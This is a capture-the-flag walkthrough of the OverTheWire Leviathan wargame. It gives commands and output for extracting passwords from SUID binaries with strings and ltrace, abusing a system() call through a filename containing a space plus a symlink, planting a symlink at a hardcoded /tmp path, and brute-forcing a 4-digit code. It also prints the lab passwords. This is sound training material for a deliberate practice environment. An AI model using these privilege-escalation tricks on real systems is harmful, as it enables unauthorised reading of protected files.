# OverTheWire Leviathan Writeup (Levels 0-7)

---
## Level 0 → 1

### Solution
Log in as `leviathan0` and look around:
```bash
ls -la
# Notice a hidden .backup directory owned by leviathan1
cd .backup
ls
# bookmarks.html
cat bookmarks.html | grep password
```

**Output:**
```
<DT><A HREF="http://leviathan.labs.overthewire.org/passwordus.html | 
This will be fixed later, the password for leviathan1 is 3QJ3TgzHDq" ...>
```

The password was hiding in a Firefox bookmarks HTML file inside a hidden `.backup` directory. A simple `grep password` on the file reveals it.

---

## Level 1 → 2

### Analysis
There's a SUID binary called `check` owned by `leviathan2`. Running it asks for a password.

```bash
ls -la
# -r-sr-x--- 1 leviathan2 leviathan1 check  ← SUID binary
./check
# password: ???
```

```bash
strings check
```

Notable output:
```
sex
secr
love
password:
/bin/sh
Wrong password, Good Bye ...
```

Several candidate strings are visible. Testing them:
```bash
./check
# password: love   → Wrong
./check
# password: secr   → Wrong
./check
# password: sex    → SUCCESS → drops into shell as leviathan2!
```

```bash
$ whoami
leviathan2
$ cat /etc/leviathan_pass/leviathan2
NsN1HwFoyN
```

### Why it works
`strings` extracts printable character sequences from a binary. The XOR key or comparison string was stored in plaintext in the `.rodata` section. The binary uses `strcmp()` to compare your input against the hardcoded password `sex`.

---

## Level 2 → 3

### Analysis
A SUID binary `printfile` owned by `leviathan3`:
```bash
./printfile
# *** File Printer ***
# Usage: ./printfile filename
```

```bash
cd /tmp
ltrace ~/printfile /tmp/text.txt
```

Key output:
```
access("text.txt", 4)                        = 0
snprintf("/bin/cat text.txt", 511, "/bin/cat %s", "text.txt") = ...
system("/bin/cat text.txt")
```

**The vulnerability:** `access()` checks permissions on the full filename as one string, but `system("/bin/cat <filename>")` passes it to the shell — which **splits on spaces**. So a filename with a space becomes two arguments to `cat`.

### Exploit: Filename with space + symlink
```bash
cd /tmp

# Create a file whose name contains a space
echo hi > "text.txt file.txt"

# Create a symlink: the second "word" of the filename points to the password
ln -s /etc/leviathan_pass/leviathan3 file.txt

# Run printfile with the spaced filename
~/printfile "text.txt file.txt"
```

What happens:
- `access("text.txt file.txt", 4)` — checks the whole string as one file → passes (we own it)
- `system("/bin/cat text.txt file.txt")` — shell splits this into TWO files: `text.txt` and `file.txt`
- `file.txt` is a symlink to the password file, and the program runs as `leviathan3` (SUID), so it can read it!

**Output:**
```
/tmp/file
f0n8h2iWLP
```

---

## Level 3 → 4

### Analysis
A SUID binary `level3`. Running `strings` shows candidates: `snlprintf`, `h0no33`, `kakaka`, `kaka`, `secret`, etc.

```bash
ltrace ./level3
```

Output:
```
strcmp("h0no33", "kakaka")       = -1    ← internal check, not our input
printf("Enter the password> ")
fgets("hi\n", 256, ...)
strcmp("hi\n", "snlprintf\n")    = -1    ← OUR input is compared to "snlprintf"
puts("bzzzzzzzzap. WRONG")
```

`ltrace` intercepts library calls at runtime and shows the actual arguments — including the secret string being compared against.

### Solution
```bash
./level3
# Enter the password> snlprintf
# [You've got shell]!
$ cat /etc/leviathan_pass/leviathan4
WG1egElCvO
```

---

## Level 4 → 5

### Analysis
```bash
ls -la
# Hidden .trash directory
cd .trash && ls
# bin
./bin
# 00110000 01100100 01111001 01111000 ...  ← binary output!
```

`ltrace ./bin` reveals it tries to read `/etc/leviathan_pass/leviathan5` — it's printing the password in **binary (8-bit ASCII)**!

### Solution
```bash
./bin | sed 's/ //g' | perl -lpe '$_=pack"B*",$_'
```

Step by step:
- `./bin` — outputs space-separated 8-bit binary strings
- `sed 's/ //g'` — removes all spaces, concatenating the bits
- `perl -lpe '$_=pack"B*",$_'` — interprets the bit string as binary and packs it into ASCII characters

**Output:** `0dyxT7F4QD`

---

## Level 5 → 6

### Analysis
A SUID binary `leviathan5`:
```bash
./leviathan5
# Cannot find /tmp/file.log
```

It looks for a hardcoded file at `/tmp/file.log` and prints its contents — running as `leviathan6` (SUID).

### Solution
```bash
# Point /tmp/file.log at the password file
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log

# Run the binary — it reads the symlink target with elevated privileges
./leviathan5
# szo7HDB88w
```

The program doesn't validate that the file is a regular file or check what it points to. Since it runs as `leviathan6`, it can read the password file that we normally can't.

---

## Level 6 → 7

### Analysis
A binary that takes a 4-digit code:
```bash
./leviathan6 1111
# Wrong
```

There are 10,000 possible combinations (0000–9999). No `strings` or `ltrace` shortcut this time — just brute-force.

### Solution
```bash
for i in {0000..9999}; do
    result=$(./leviathan6 $i)
    if echo "$result" | grep -qv "Wrong"; then
        echo "Found: $i"
        echo "$result"
        break
    fi
done
```

Or the simpler (noisier) version from the notes:
```bash
for i in {0000..9999}; do echo $i; ./leviathan6 $i | grep -v "Wrong"; done
```

The correct code is **7123**, which drops a shell as `leviathan7`:
```bash
$ cat /etc/leviathan_pass/leviathan7
qEs5Io5yM8
```

---

## Level 7

```bash
cat CONGRATULATIONS
# Well Done, you seem to have used a *nix system before,
# now try something more serious.
```
